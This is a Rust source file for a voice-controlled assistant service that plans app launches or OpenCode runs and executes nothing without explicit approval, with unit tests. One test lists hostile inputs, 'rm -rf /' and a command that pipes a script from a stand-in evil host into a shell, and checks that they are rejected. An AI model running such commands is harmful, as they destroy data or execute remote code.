//! One task at a time, explicit phases, nothing runs without approval.
//!
//! idle -> listening -> transcribing -> planning -> awaiting_approval -> running
//!      -> completed | failed | cancelled

use std::path::PathBuf;
use std::sync::{Arc, Mutex, MutexGuard};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::Serialize;

use crate::hexcli::{Stt, SttError};
use crate::opencode::{self, Canceller, Run, RunConfig, RunStatus};
use crate::phase::Phase;
use crate::tools::{self, Action};

pub const MAX_INPUT: usize = 1500;
const MAX_EVENTS: usize = 400;

#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    Actions,
    Work,
}

impl Mode {
    pub fn parse(s: &str) -> Result<Self, String> {
        match s {
            "actions" => Ok(Self::Actions),
            "work" => Ok(Self::Work),
            _ => Err("Mode must be actions or work".into()),
        }
    }
}

#[derive(Clone, Debug, Serialize)]
pub struct Step {
    pub title: String,
    /// pending | running | launched | done | failed
    pub status: String,
    pub risk: String,
}

#[derive(Clone, Debug, Serialize)]
pub struct Task {
    pub id: u64,
    pub mode: Mode,
    pub text: String,
    pub steps: Vec<Step>,
    pub phase: Phase,
    pub error: Option<String>,
    pub summary: Option<String>,
    pub changed_files: Option<Vec<String>>,
    pub workspace: Option<String>,
}

#[derive(Clone, Debug, Serialize)]
pub struct Event {
    pub n: u64,
    pub t: u64,
    pub kind: String,
    pub text: String,
}

#[derive(Clone, Debug, Serialize)]
pub struct Snapshot {
    pub phase: Phase,
    pub task: Option<Task>,
    pub events: Vec<Event>,
    pub workspace: Option<String>,
    pub opencode_found: bool,
}

/// Launches validated actions (faked in tests).
pub trait Launcher: Send + Sync {
    fn launch(&self, action: &Action) -> Result<String, String>;
}

pub struct RealLauncher;

impl Launcher for RealLauncher {
    fn launch(&self, action: &Action) -> Result<String, String> {
        action.execute()
    }
}

struct State {
    phase: Phase,
    task: Option<Task>,
    events: Vec<Event>,
    seq: u64,
    serial: u64,
    actions: Vec<Action>,
    canceller: Option<Canceller>,
    stop_requested: bool,
    voice_mode: Mode,
    workspace: Option<PathBuf>,
}

#[derive(Clone)]
pub struct Service {
    state: Arc<Mutex<State>>,
    stt: Arc<dyn Stt>,
    launcher: Arc<dyn Launcher>,
    opencode_exe: Arc<Mutex<Option<PathBuf>>>,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

impl Service {
    pub fn new(
        stt: Arc<dyn Stt>,
        launcher: Arc<dyn Launcher>,
        opencode_exe: Option<PathBuf>,
    ) -> Self {
        let state = State {
            phase: Phase::Idle,
            task: None,
            events: vec![],
            seq: 0,
            serial: 0,
            actions: vec![],
            canceller: None,
            stop_requested: false,
            voice_mode: Mode::Actions,
            workspace: None,
        };
        Self {
            state: Arc::new(Mutex::new(state)),
            stt,
            launcher,
            opencode_exe: Arc::new(Mutex::new(opencode_exe)),
        }
    }

    fn lock(&self) -> MutexGuard<'_, State> {
        self.state.lock().unwrap_or_else(|p| p.into_inner())
    }

    pub fn emit(&self, kind: &str, text: &str) {
        emit(&mut self.lock(), kind, text);
    }

    pub fn snapshot(&self, since: u64) -> Snapshot {
        let s = self.lock();
        Snapshot {
            phase: s.phase,
            task: s.task.clone(),
            events: s.events.iter().filter(|e| e.n > since).cloned().collect(),
            workspace: s.workspace.as_ref().map(|p| p.display().to_string()),
            opencode_found: self
                .opencode_exe
                .lock()
                .map(|e| e.is_some())
                .unwrap_or(false),
        }
    }

    pub fn set_workspace(&self, path: &str) -> Result<String, String> {
        let mut s = self.lock();
        if s.phase.is_busy() {
            return Err(busy(s.phase));
        }
        let resolved = opencode::validate_workspace(path.as_ref())?;
        let shown = resolved.display().to_string();
        emit(&mut s, "info", &format!("Workspace set to {shown}"));
        s.workspace = Some(resolved);
        Ok(shown)
    }

    // ---- planning ----------------------------------------------------------------------

    pub fn plan(&self, text: &str, mode: Mode) -> Result<Task, String> {
        let text = text.trim();
        if text.is_empty() || text.chars().count() > MAX_INPUT {
            return Err("Enter a task of 1-1,500 characters".into());
        }
        let mut s = self.lock();
        if s.phase.is_busy() {
            return Err(busy(s.phase));
        }
        let (steps, actions, workspace) = match mode {
            Mode::Actions => {
                let actions = tools::plan_rules(text).ok_or(
                    "Not understood. Try 'open Firefox' or 'search YouTube for ...'. Nothing was run.")?;
                let steps = actions
                    .iter()
                    .map(|a| Step {
                        title: a.describe(),
                        status: "pending".into(),
                        risk: "launches an app".into(),
                    })
                    .collect();
                (steps, actions, None)
            }
            Mode::Work => {
                let ws = s
                    .workspace
                    .clone()
                    .ok_or("Choose a project workspace first")?;
                if self
                    .opencode_exe
                    .lock()
                    .map(|e| e.is_none())
                    .unwrap_or(true)
                {
                    return Err("OpenCode CLI not found on PATH".into());
                }
                let step = |t: &str, risk: &str| Step {
                    title: t.into(),
                    status: "pending".into(),
                    risk: risk.into(),
                };
                let steps = vec![
                    step(
                        &format!("Run OpenCode in {}", ws.display()),
                        "can modify files in this folder",
                    ),
                    step("Stream agent activity", ""),
                    step("Report exit status and changed files", ""),
                ];
                (steps, vec![], Some(ws.display().to_string()))
            }
        };
        s.serial += 1;
        let task = Task {
            id: s.serial,
            mode,
            text: text.into(),
            steps,
            phase: Phase::AwaitingApproval,
            error: None,
            summary: None,
            changed_files: None,
            workspace,
        };
        s.phase = Phase::AwaitingApproval;
        s.actions = actions;
        s.task = Some(task.clone());
        emit(
            &mut s,
            "plan",
            &format!(
                "Planned {}: {text}",
                if mode == Mode::Work {
                    "work"
                } else {
                    "actions"
                }
            ),
        );
        Ok(task)
    }

    // ---- execution ---------------------------------------------------------------------

    pub fn approve(&self, task_id: u64) -> Result<(), String> {
        let (task, actions) = {
            let mut s = self.lock();
            let matches_task = s.task.as_ref().is_some_and(|t| t.id == task_id);
            if !matches_task || s.phase != Phase::AwaitingApproval {
                return Err("No matching task awaiting approval".into());
            }
            set_phase(&mut s, Phase::Running);
            s.stop_requested = false;
            emit(&mut s, "info", "Approved");
            (s.task.clone().ok_or("no task")?, s.actions.clone())
        };
        let me = self.clone();
        thread::spawn(move || match task.mode {
            Mode::Actions => me.run_actions(&actions),
            Mode::Work => me.run_work(&task),
        });
        Ok(())
    }

    fn run_actions(&self, actions: &[Action]) {
        let mut launched = 0;
        for (i, action) in actions.iter().enumerate() {
            if self.lock().stop_requested {
                break;
            }
            self.set_step(i, "running");
            self.emit("action", &action.describe());
            match self.launcher.launch(action) {
                Ok(msg) => {
                    self.emit("result", &format!("{msg} (launched; outcome not verified)"));
                    self.set_step(i, "launched");
                    launched += 1;
                }
                Err(e) => {
                    self.set_step(i, "failed");
                    return self.finish(Phase::Failed, Some(format!("Stopped: {e}")), None, None);
                }
            }
        }
        let note = format!(
            "{} action(s) launched. X does not verify that pages loaded.",
            launched
        );
        self.finish(Phase::Completed, None, Some(note), None);
    }

    fn run_work(&self, task: &Task) {
        let (Some(exe), Some(ws)) = (
            self.opencode_exe.lock().ok().and_then(|e| e.clone()),
            task.workspace.clone(),
        ) else {
            return self.finish(
                Phase::Failed,
                Some("OpenCode or workspace missing".into()),
                None,
                None,
            );
        };
        let Ok(ws) = opencode::validate_workspace(ws.as_ref()) else {
            self.set_step(0, "failed");
            return self.finish(
                Phase::Failed,
                Some("Workspace is no longer valid".into()),
                None,
                None,
            );
        };
        if self.lock().stop_requested {
            return self.finish(
                Phase::Cancelled,
                None,
                Some("Stopped before start".into()),
                None,
            );
        }
        self.set_step(0, "running");
        let me = self.clone();
        let on_event: opencode::OnEvent = Arc::new(move |k, t| me.emit(k, t));
        let run = match Run::start(RunConfig::new(exe, task.text.clone(), ws), on_event) {
            Ok(r) => r,
            Err(e) => {
                self.set_step(0, "failed");
                return self.finish(Phase::Failed, Some(e), None, None);
            }
        };
        {
            let mut s = self.lock();
            s.canceller = Some(run.canceller());
            if s.stop_requested {
                run.cancel(); // Stop pressed before the process existed
            }
        }
        self.set_step(0, "done");
        self.set_step(1, "running");
        let res = run.join();
        self.lock().canceller = None;
        let ok = res.status == RunStatus::Completed;
        self.set_step(1, if ok { "done" } else { "failed" });
        self.set_step(2, if ok { "done" } else { "failed" });
        match res.status {
            RunStatus::Cancelled => self.finish(
                Phase::Cancelled,
                None,
                Some("Stopped. Changes may already exist on disk; nothing was rolled back.".into()),
                res.changed_files,
            ),
            RunStatus::Completed => self.finish(
                Phase::Completed,
                None,
                Some("OpenCode exited 0 with no error events.".into()),
                res.changed_files,
            ),
            RunStatus::Failed => {
                let why = if res.errors.is_empty() {
                    format!(
                        "OpenCode exited with status {}",
                        res.exit_code.map_or("unknown".into(), |c| c.to_string())
                    )
                } else {
                    res.errors.join("; ")
                };
                self.finish(Phase::Failed, Some(why), None, res.changed_files)
            }
        }
    }

    fn set_step(&self, idx: usize, status: &str) {
        if let Some(step) = self.lock().task.as_mut().and_then(|t| t.steps.get_mut(idx)) {
            step.status = status.into();
        }
    }

    fn finish(
        &self,
        phase: Phase,
        error: Option<String>,
        summary: Option<String>,
        changed: Option<Vec<String>>,
    ) {
        let mut s = self.lock();
        let phase = if s.stop_requested && phase == Phase::Completed {
            Phase::Cancelled
        } else {
            phase
        };
        if let Some(t) = s.task.as_mut() {
            t.error = error.clone();
            t.summary = summary;
            t.changed_files = changed;
        }
        set_phase(&mut s, phase);
        if let Some(e) = error {
            let seen = s
                .events
                .iter()
                .rev()
                .take(8)
                .any(|ev| ev.kind == "error" && e.contains(&ev.text));
            if !seen {
                emit(&mut s, "error", &e);
            }
        }
        emit(&mut s, "info", &format!("Task {}", phase_name(phase)));
    }

    /// Stop whatever is active: discard a plan, abort a recording, or kill a run.
    pub fn cancel(&self) {
        let mut s = self.lock();
        match s.phase {
            Phase::AwaitingApproval => {
                set_phase(&mut s, Phase::Cancelled);
                emit(&mut s, "info", "Plan discarded");
            }
            Phase::Running => {
                s.stop_requested = true;
                emit(&mut s, "info", "Stop requested");
                if let Some(c) = s.canceller.clone() {
                    drop(s);
                    c.cancel();
                }
            }
            Phase::Listening | Phase::Transcribing => {
                drop(s);
                self.voice_cancel();
            }
            _ => {}
        }
    }

    // ---- voice -------------------------------------------------------------------------

    pub fn voice_start(&self, mode: Mode) -> Result<(), String> {
        {
            let mut s = self.lock();
            if s.phase.is_busy() {
                return Err(busy(s.phase));
            }
            s.voice_mode = mode;
            set_phase(&mut s, Phase::Listening);
        }
        if let Err(e) = self.stt.start() {
            let mut s = self.lock();
            if s.phase == Phase::Listening {
                set_phase(&mut s, Phase::Idle);
            }
            return Err(e.to_string());
        }
        if self.lock().phase == Phase::Idle {
            let _ = self.stt.cancel(); // cancelled while the recording was starting
            return Ok(());
        }
        self.emit("info", "Listening (Hex microphone)");
        Ok(())
    }

    pub fn voice_stop(&self) -> Result<(), String> {
        let mode = {
            let mut s = self.lock();
            if s.phase != Phase::Listening {
                return Err("Not listening".into());
            }
            set_phase(&mut s, Phase::Transcribing);
            s.voice_mode
        };
        let me = self.clone();
        thread::spawn(move || me.transcribe(mode));
        Ok(())
    }

    fn transcribe(&self, mode: Mode) {
        let result = self.stt.stop_print();
        {
            let mut s = self.lock();
            if s.phase != Phase::Transcribing {
                return; // cancelled while Hex was transcribing
            }
            set_phase(&mut s, Phase::Idle);
        }
        match result {
            Ok(text) => {
                self.emit("heard", &text.chars().take(250).collect::<String>());
                if let Err(e) = self.plan(&text, mode) {
                    self.emit("error", &e);
                }
            }
            Err(SttError::NoSpeech) => self.emit("info", "No speech heard"),
            Err(e) => self.emit("error", &format!("Transcription failed: {e}")),
        }
    }

    pub fn voice_cancel(&self) {
        {
            let mut s = self.lock();
            if !matches!(s.phase, Phase::Listening | Phase::Transcribing) {
                return;
            }
            set_phase(&mut s, Phase::Idle);
        }
        match self.stt.cancel() {
            Ok(()) => self.emit("info", "Recording discarded"),
            Err(e) => self.emit("error", &format!("Could not cancel recording: {e}")),
        }
    }

    /// App exit: stop any run and drop any recording. Blocks until the run is reaped.
    pub fn shutdown(&self) {
        self.cancel();
        for _ in 0..200 {
            if !self.lock().phase.is_busy() {
                return;
            }
            thread::sleep(std::time::Duration::from_millis(50));
        }
    }
}

fn busy(phase: Phase) -> String {
    format!(
        "Busy ({}): finish or cancel the current task first",
        phase_name(phase)
    )
}

fn phase_name(p: Phase) -> &'static str {
    match p {
        Phase::Idle => "idle",
        Phase::Listening => "listening",
        Phase::Transcribing => "transcribing",
        Phase::Planning => "planning",
        Phase::AwaitingApproval => "awaiting_approval",
        Phase::Running => "running",
        Phase::Completed => "completed",
        Phase::Failed => "failed",
        Phase::Cancelled => "cancelled",
    }
}

fn set_phase(s: &mut State, next: Phase) {
    debug_assert!(
        s.phase == next || s.phase.can_move_to(next),
        "illegal {:?} -> {next:?}",
        s.phase
    );
    s.phase = next;
    if let Some(t) = s.task.as_mut() {
        t.phase = next;
    }
}

fn emit(s: &mut State, kind: &str, text: &str) {
    s.seq += 1;
    let (n, t) = (s.seq, now());
    s.events.push(Event {
        n,
        t,
        kind: kind.into(),
        text: text.chars().take(650).collect(),
    });
    if s.events.len() > MAX_EVENTS {
        s.events.remove(0);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::time::{Duration, Instant};

    #[derive(Default)]
    struct FakeStt {
        transcript: Mutex<Option<Result<String, SttError>>>,
        starts: AtomicUsize,
        cancels: AtomicUsize,
    }

    impl Stt for FakeStt {
        fn start(&self) -> Result<(), SttError> {
            self.starts.fetch_add(1, Ordering::SeqCst);
            Ok(())
        }
        fn stop_print(&self) -> Result<String, SttError> {
            self.transcript
                .lock()
                .unwrap()
                .take()
                .unwrap_or(Err(SttError::NoSpeech))
        }
        fn cancel(&self) -> Result<(), SttError> {
            self.cancels.fetch_add(1, Ordering::SeqCst);
            Ok(())
        }
    }

    #[derive(Default)]
    struct FakeLauncher {
        launched: Mutex<Vec<String>>,
        fail_on: Mutex<Option<String>>,
    }

    impl Launcher for FakeLauncher {
        fn launch(&self, a: &Action) -> Result<String, String> {
            if self.fail_on.lock().unwrap().as_deref() == Some(a.describe().as_str()) {
                return Err("boom".into());
            }
            self.launched.lock().unwrap().push(a.describe());
            Ok(format!("Launched {}", a.describe()))
        }
    }

    fn rig() -> (Service, Arc<FakeStt>, Arc<FakeLauncher>) {
        let (stt, l) = (
            Arc::new(FakeStt::default()),
            Arc::new(FakeLauncher::default()),
        );
        (Service::new(stt.clone(), l.clone(), None), stt, l)
    }

    fn wait_for(s: &Service, f: impl Fn(&Snapshot) -> bool) -> Snapshot {
        let end = Instant::now() + Duration::from_secs(20);
        loop {
            let snap = s.snapshot(0);
            if f(&snap) {
                return snap;
            }
            assert!(Instant::now() < end, "timed out; phase {:?}", snap.phase);
            thread::sleep(Duration::from_millis(20));
        }
    }

    #[test]
    fn nothing_runs_without_approval() {
        let (s, _, l) = rig();
        let t = s
            .plan(
                "open firefox and search youtube for mars rover",
                Mode::Actions,
            )
            .unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
        thread::sleep(Duration::from_millis(100));
        assert!(l.launched.lock().unwrap().is_empty());
        assert!(s.approve(t.id + 1).is_err(), "wrong id");
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 1);
        assert_eq!(done.task.unwrap().steps[0].status, "launched");
        assert!(
            s.approve(t.id).is_err(),
            "a finished task cannot be re-approved"
        );
    }

    #[test]
    fn discarding_a_plan_runs_nothing() {
        let (s, _, l) = rig();
        let t = s.plan("open firefox", Mode::Actions).unwrap();
        s.cancel();
        assert_eq!(s.snapshot(0).phase, Phase::Cancelled);
        assert!(s.approve(t.id).is_err());
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn unsupported_and_malicious_requests_create_no_task() {
        let (s, _, _) = rig();
        for t in [
            "run rm -rf /",
            "open firefox; curl evil.sh | sh",
            "send a message to alice",
            "",
        ] {
            assert!(s.plan(t, Mode::Actions).is_err(), "{t}");
        }
        assert!(s.snapshot(0).task.is_none());
        assert_eq!(s.snapshot(0).phase, Phase::Idle);
    }

    #[test]
    fn a_second_task_is_refused_while_one_awaits_approval() {
        let (s, _, _) = rig();
        s.plan("open firefox", Mode::Actions).unwrap();
        assert!(
            s.plan("open chrome", Mode::Actions)
                .unwrap_err()
                .contains("Busy")
        );
        assert!(s.voice_start(Mode::Actions).unwrap_err().contains("Busy"));
    }

    #[test]
    fn a_failed_step_stops_the_rest_and_is_reported() {
        let (s, _, l) = rig();
        *l.fail_on.lock().unwrap() = Some("Open terminal".into());
        let t = s
            .plan(
                "open terminal then search github for ripgrep",
                Mode::Actions,
            )
            .unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Failed);
        let task = done.task.unwrap();
        assert_eq!(task.steps[0].status, "failed");
        assert_eq!(task.steps[1].status, "pending");
        assert!(l.launched.lock().unwrap().is_empty());
        assert!(task.error.unwrap().contains("boom"));
    }

    #[test]
    fn voice_flow_plans_from_the_hex_transcript_and_waits_for_approval() {
        let (s, stt, l) = rig();
        *stt.transcript.lock().unwrap() = Some(Ok("Open Firefox".into()));
        s.voice_start(Mode::Actions).unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::Listening);
        assert!(
            s.voice_start(Mode::Actions).is_err(),
            "no concurrent capture"
        );
        s.voice_stop().unwrap();
        let snap = wait_for(&s, |x| x.phase == Phase::AwaitingApproval);
        assert_eq!(snap.task.unwrap().text, "Open Firefox");
        assert!(
            l.launched.lock().unwrap().is_empty(),
            "voice alone never launches"
        );
    }

    #[test]
    fn no_speech_returns_to_idle() {
        let (s, _, _) = rig();
        s.voice_start(Mode::Actions).unwrap();
        s.voice_stop().unwrap();
        wait_for(&s, |x| x.phase == Phase::Idle);
        assert!(
            s.snapshot(0)
                .events
                .iter()
                .any(|e| e.text.contains("No speech"))
        );
    }

    #[test]
    fn cancelling_while_listening_discards_the_recording() {
        let (s, stt, _) = rig();
        s.voice_start(Mode::Work).unwrap();
        s.cancel();
        assert_eq!(s.snapshot(0).phase, Phase::Idle);
        assert_eq!(stt.cancels.load(Ordering::SeqCst), 1);
    }

    fn fake_opencode(dir: &std::path::Path, body: &str) -> PathBuf {
        let p = dir.join("opencode");
        std::fs::write(&p, format!("#!/bin/sh\nif [ \"$2\" = \"--help\" ]; then echo '--standalone'; exit 0; fi\n{body}\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
        p
    }

    fn work_rig(body: &str) -> (Service, tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir(&repo).unwrap();
        for a in [
            &["init", "-q"][..],
            &["config", "user.email", "t@t"],
            &["config", "user.name", "t"],
        ] {
            assert!(
                std::process::Command::new("git")
                    .arg("-C")
                    .arg(&repo)
                    .args(a)
                    .status()
                    .unwrap()
                    .success()
            );
        }
        let exe = fake_opencode(dir.path(), body);
        let s = Service::new(
            Arc::new(FakeStt::default()),
            Arc::new(FakeLauncher::default()),
            Some(exe),
        );
        s.set_workspace(repo.to_str().unwrap()).unwrap();
        (s, dir, repo)
    }

    #[test]
    fn work_requires_a_workspace_and_opencode() {
        let (s, _, _) = rig();
        assert!(
            s.plan("fix the bug", Mode::Work)
                .unwrap_err()
                .contains("workspace")
        );
        assert!(s.set_workspace("/").is_err());
    }

    #[test]
    fn work_run_completes_with_changed_files() {
        let (s, _d, repo) =
            work_rig("echo hi > new.txt\necho '{\"type\":\"text\",\"part\":{\"text\":\"done\"}}'");
        let t = s.plan("add a file", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed).task.unwrap();
        assert_eq!(done.changed_files, Some(vec!["new.txt".to_string()]));
        assert!(repo.join("new.txt").exists());
    }

    #[test]
    fn work_error_event_is_a_failure() {
        let (s, _d, _) = work_rig(
            "echo '{\"type\":\"error\",\"error\":{\"message\":\"no provider\"}}'\nsleep 60",
        );
        let t = s.plan("anything", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        let task = wait_for(&s, |x| x.phase == Phase::Failed).task.unwrap();
        assert!(task.error.unwrap().contains("no provider"));
    }

    #[test]
    fn stop_cancels_a_running_task_and_reports_partial_changes() {
        let (s, _d, repo) = work_rig("echo partial > half.txt\necho '{}'\nsleep 60");
        let t = s.plan("long job", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        for _ in 0..100 {
            if repo.join("half.txt").exists() {
                break;
            }
            thread::sleep(Duration::from_millis(50));
        }
        thread::sleep(Duration::from_millis(300));
        s.cancel();
        let task = wait_for(&s, |x| x.phase == Phase::Cancelled).task.unwrap();
        assert_eq!(task.changed_files, Some(vec!["half.txt".to_string()]));
        assert!(task.summary.unwrap().contains("nothing was rolled back"));
    }

    #[test]
    fn shutdown_stops_a_running_task() {
        let (s, _d, _) = work_rig("sleep 60");
        let t = s.plan("job", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        thread::sleep(Duration::from_millis(500));
        s.shutdown();
        assert!(!s.snapshot(0).phase.is_busy());
    }
}
